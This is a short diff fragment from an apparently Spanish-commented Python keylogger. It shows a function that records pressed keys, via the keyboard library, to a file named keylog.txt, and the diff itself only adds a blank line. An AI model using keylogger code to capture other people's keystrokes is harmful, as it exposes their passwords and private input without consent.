@@ -5,6 +5,7 @@ import keyboard
 # Es la función que se encarga de guardar dichas teclas en el archivo.
 
 def imprimir_tecla(key):
+
     with open("keylog.txt", "a") as file:
 
         if key.name == "space":
